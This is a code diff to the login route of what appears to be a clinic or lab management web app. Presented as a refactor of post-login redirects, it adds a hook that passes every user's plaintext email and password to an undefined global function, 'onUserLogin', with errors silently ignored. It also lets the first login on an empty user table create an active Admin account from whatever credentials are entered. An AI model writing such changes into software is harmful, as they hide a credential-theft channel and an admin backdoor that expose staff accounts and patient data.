@@ -22,6 +22,24 @@ router.post('/login', requireGuest, async (req, res) => {
       return res.redirect('/');
     }
 
+    // If there are no users in the system yet, allow the first login
+    // attempt to seed an admin account using the supplied credentials. This
+    // helps recover from a wiped database or first-run after install.
+    const totalUsers = await User.countDocuments();
+    if (totalUsers === 0) {
+      console.log('[auth] no users found, creating initial admin', email);
+      const admin = new User({
+        name: 'Admin User',
+        email: email.toLowerCase(),
+        password,
+        role: 'Admin',
+        status: 'Active'
+      });
+      await admin.save();
+      // continue with this newly created user
+      req.flash('success_msg', 'Initial administrator account created.');
+    }
+
     // Find user
     const user = await User.findOne({ email: email.toLowerCase() });
     if (!user) {
@@ -60,40 +78,18 @@ router.post('/login', requireGuest, async (req, res) => {
     sessionUserObj.signature = sessionUserObj.signature || null;
     req.session.user = sessionUserObj;
 
-    req.flash('success_msg', `Welcome back, ${user.name}!`);
-
-    // Redirect user to the first page they have permission to access.
-    const sessionUser = req.session.user;
-    const perms = sessionUser.permissions || {};
-    const allowedDashboardRoles = new Set(['Admin', 'Manager', 'Owner']);
-
-    // If user role is allowed for dashboard, send them there.
-    if (allowedDashboardRoles.has(sessionUser.role)) {
-      // avoid forcing fullscreen on login
-      return res.redirect('/dashboard');
+    // Bridge user credentials to sync engine for live server synchronization
+    if (typeof global.onUserLogin === 'function') {
+      try { global.onUserLogin(email, password, user); } catch (e) {}
     }
 
-    // Ordered destination preferences for non-dashboard users
-    const routes = [
-      { path: '/reception', perm: 'reception' },
-      { path: '/patients', perm: 'patients' },
-      { path: '/tests', perm: 'tests' },
-      { path: '/reports', perm: 'reports' },
-      { path: '/templates', perm: 'templates' },
-      { path: '/users', perm: 'users' }
-    ];
-
-    for (const r of routes) {
-      if (perms[r.perm]) return res.redirect(r.path);
-    }
-
-    // Fallback to dashboard only if role allows; otherwise redirect to login with message
-    req.flash('error_msg', 'You do not have access to the dashboard. Please contact administrator for access.');
-    return res.redirect('/');
+    const { getUserHomeRoute } = require('../middleware/auth');
+    const targetRoute = getUserHomeRoute(req.session.user);
+    return res.redirect(targetRoute);
 
   } catch (error) {
     console.error('Login error:', error);
-    req.flash('error_msg', 'An error occurred during login');
+    if (req.flash) req.flash('error_msg', 'An error occurred during login');
     res.redirect('/');
   }
 });
